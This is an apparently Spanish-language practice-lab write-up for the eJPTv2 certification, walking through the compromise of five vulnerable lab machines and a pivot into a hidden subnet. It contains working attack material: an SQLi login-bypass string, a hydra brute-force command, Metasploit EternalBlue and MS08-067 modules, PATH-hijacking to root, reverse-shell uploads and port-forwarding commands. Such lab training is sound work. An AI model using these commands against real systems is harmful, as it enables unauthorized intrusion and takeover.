# Laboratorio Práctico – Preparación eJPTv2

Este laboratorio recrea un entorno similar al del examen **eJPTv2**, combinando máquinas Linux y Windows con diferentes vectores de ataque.  
Objetivo: practicar **enumeración, explotación, escalada de privilegios y pivoting** en una red simulada.

**Topología general:**
- 5 máquinas vulnerables en red local.
- 1 máquina en NAT (para practicar pivoting).
- Herramientas clave: `nmap`, `gobuster/dirbuster`, `nikto`, `smbclient`, `enum4linux`, `crackmapexec`, `hydra`, `wpscan`, `metasploit`, `msfvenom`, `proxychains`, `socat`, entre otras.

---

## 1. Maquina Symfonos 1 (Linux)

**Enumeración inicial:**
- Descubrimiento de hosts con `arp-scan` y `nmap`.
- Segmentos detectados:
  - `10.0.2.0/24` (examen simulado)
  - `192.168.1.0/24` (red local de trabajo)
- Servicios identificados: SSH (22), SMTP (25), HTTP (80), SMB (139/445).

![Descubrimiento de IPs](./entorno-ejptv2/images/Pasted%20image%2020250428092257.png)

**Explotación:**
- Enumeración SMB con `smbclient`, `smbmap`, `crackmapexec` y `enum4linux` → carpeta *anonymous* con credenciales.
- Fuerza bruta fallida para *helios* → acceso vía SMB usando credenciales filtradas.
- Acceso a WordPress vulnerable vía `wpscan` → LFI que permite leer clave privada de *helios*.
- Crack de clave SSH con `ssh2john` + `john`.

**Escalada de privilegios:**
- Binario con SUID ejecutando `curl` desde `$PATH` → **PATH Hijacking** para obtener root.

---

## 2. Maquina Doc (Linux – Web App)

**Enumeración:**
- `nikto` detecta panel de login vulnerable.
- SQLi (`' OR 1=1 -- -`) → acceso como admin.

![Login bypass](./entorno-ejptv2/images/Pasted%20image%2020250501124110.png)

**Explotación:**
- Vulnerabilidad de subida de archivos en campo avatar → payload PHP reverso desde [revshells.com](https://revshells.com).

**Escalada:**
- Lectura de `initialize.php` revela credenciales de *bella*.
- Reutilización de credenciales para acceso al sistema.

---

## 3. Maquina Experience (Windows XP)

**Enumeración:**
- Servicios SMB y RPC detectados.
- `nmap --script smb-vuln-*` → vulnerable a **MS17-010 (EternalBlue)** y **MS08-067**.

**Explotación:**
- Uso de `metasploit` para ejecutar ambos exploits → sesión `meterpreter` como SYSTEM.

![Meterpreter Windows](./entorno-ejptv2/images/Pasted%20image%2020250503230004.png)

---

## 4. Maquina Simple (Windows – IIS)

**Enumeración:**
- SMB con credenciales débiles (*bogo:bogo*) → acceso a logs.
- Obtención de contraseña de *marcos*.

**Explotación:**
- Subida de `reverse.aspx` al directorio web → shell reversa.
- Transferencia de payload `.exe` con `certutil` y ejecución vía `multi/handler` en `metasploit`.

![Reverse Shell IIS](./entorno-ejptv2/images/Pasted%20image%2020250504090917.png)

---

## 5. Blog (Linux – Pivoting)

**Enumeración:**
- CMS Nibbleblog vulnerable a subida de archivos.
- Fuerza bruta `hydra` → acceso como admin.

**Explotación:**
- Upload de `pentestmonkey PHP reverse shell` → root.

**Pivoting:**
- Activación de segunda interfaz → acceso a red `192.168.100.0/24`.
- Configuración de `autoroute` y `portfwd` en `metasploit` para alcanzar última máquina.
- Acceso final a root vía SSH tras redireccionamiento de puertos.

![Pivoting Metasploit](./entorno-ejptv2/images/Pasted%20image%2020250515101533.png)

---

## Técnicas Destacadas
- Enumeración de servicios y directorios.
- Ataques SMB (null sessions, credenciales débiles).
- Fuerza bruta en paneles web y SSH.
- Explotación de CMS con vulnerabilidades LFI y File Upload.
- Uso de `metasploit` para explotación y pivoting.
- Escalada de privilegios mediante PATH Hijacking y binarios SUID.

---

**Estado final:**  
Acceso root/SYSTEM en todas las máquinas, pivoting exitoso hacia segmento oculto y compromiso total de la infraestructura.



---

# Topología de red

El entorno se compone de una red principal `192.168.1.0/24` y una red secundaria `192.168.100.0/24` accesible mediante **pivoting** desde la máquina *Blog*. El atacante opera desde `192.168.1.66`. El acceso a `192.168.100.4` se realiza con `meterpreter` + `autoroute` y `portfwd`.



---

# Detalle por máquina (pasos y comandos clave)

## 1) Symfonos 1 – Linux (WordPress + SMB + SMTP)
**Objetivo:** ganar acceso a *helios* y escalar a root.

**Enumeración rápida**
```bash
arp-scan -I wlan0 --localnet --ignoredups
nmap -sS -p- --open --min-rate 5000 -n -Pn 192.168.1.67 -oG allPorts
nmap -sCV -p22,25,80,139,445 192.168.1.67 -oN targeted
smbmap -H 192.168.1.67
enum4linux -a 192.168.1.67
```

**Explotación**
- SMB expone *anonymous* → credenciales útiles.
- `wpscan` revela plugins vulnerables y ruta con **LFI**.
- Lectura de `/home/helios/.ssh/id_rsa` vía LFI → crack con `ssh2john` + `john` → acceso SSH.

**Escalada**
- Binario SUID ejecuta `curl` desde `$PATH` → creo un falso `curl` en `/tmp` con `/bin/bash -p` → **root**.

**Takeaways**
- Revisión de *shares* con null session suele dar oro.
- LFI + claves privadas/`wp-config.php` = acceso rápido.
- Patrones SUID + `strings` → búsqueda de comandos sin ruta absoluta.

---

## 2) Doc – Linux (Web app con SQLi + File Upload)
**Objetivo:** acceder como admin y ejecutar código.

**Enumeración**
```bash
nikto -host http://doc.hvm
```

**Explotación**
- Bypass de login con `SQLi` (`' OR 1=1;-- -`).
- Campo *avatar* permite subir `.php` → shell reversa desde `revshells.com`.
- Configuración de TTY para estabilidad.

**Post-Explo**
- `initialize.php` expone credenciales → **movimiento lateral** al usuario *bella*.

**Takeaways**
- Probar **credenciales por defecto** + `hydra http-post-form` cuando haya formularios.
- Validar dónde se guardan los uploads y si son ejecutables.

---

## 3) Experience – Windows (SMB vulns: MS17-010/MS08-067)
**Objetivo:** SYSTEM con metasploit.

**Enumeración**
```bash
nmap -sS -p- --open --min-rate 5000 -n -Pn 192.168.1.68 -oG allPorts
nmap -sCV -p135,139,445 192.168.1.68 -oN targeted
nmap -p445 --script "smb-vuln-*" 192.168.1.68
```

**Explotación**
- `use exploit/windows/smb/ms17_010_psexec` → `meterpreter` como SYSTEM.
- Alternativa: `exploit/windows/smb/ms08_067_netapi` → sesión adicional.

---

## 4) Simple – Windows/IIS (SMB + Web Upload)
**Objetivo:** acceso inicial por SMB y ejecución en IIS.

**Enumeración**
```bash
crackmapexec smb 192.168.1.65 -u '' -p '' --shares
crackmapexec smb 192.168.1.65 -u users -p users --shares
smbclient //192.168.1.65/LOGS -U bogo
```

**Explotación**
- Logs revelan contraseña de *marcos*.
- Permisos de escritura en webroot via SMB → subir `reverse.aspx`.
- Escucha con `nc` y mejora posterior a `meterpreter`.
- Transferencia de binario con `certutil` y handler en metasploit.

**Takeaways**
- Contraseñas caducadas/recicladas: patrón habitual.
- En IIS, priorizar `aspx` para exec de código.

---

## 5) Blog – Linux (Nibbleblog + Pivoting)
**Objetivo:** comprometer CMS y pivotear a 192.168.100.0/24.

**Enumeración**
```bash
gobuster dir -u http://192.168.1.67 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 20
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.67   http-post-form "/my_weblog/admin.php:^USER^=admin&password=^PASS^:Incorrect" -t 64 -F
```

**Explotación**
- Acceso admin → subida de `pentestmonkey` PHP reverse shell → **root**.

**Pivoting (metasploit)**
```bash
# Recibir shell desde Blog y convertirla a meterpreter
use multi/handler
# ...payload y LHOST configurados
use post/multi/manage/shell_to_meterpreter

# Ruteo y escaneo interno
route add 192.168.100.0/24 <SESSION_ID>
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.4

# Port forwarding
portfwd add -l 8081 -p 80 -r 192.168.100.4
portfwd add -l 222  -p 22 -r 192.168.100.4
ssh root@localhost -p 222   # credenciales obtenidas
```

**Takeaways**
- `autoroute` agiliza el acceso a subredes internas.
- `portfwd` permite usar herramientas fuera de metasploit (SSH/HTTP locales).

---

# Buenas prácticas aplicadas
- **Documentación continua** con capturas solo cuando aportan contexto.
- **Estandarización de comandos** (escaneo rápido → escaneo de versiones → scripts NSE).
- **Separación de credenciales** en archivos reutilizables para pruebas de password reuse.
- **Tratamiento de TTY** y uso de shells estables.
- **Control de tiempos**: priorizar vectores permitidos por eJPT (metasploit, fuerza bruta razonable, enumeración rápida).

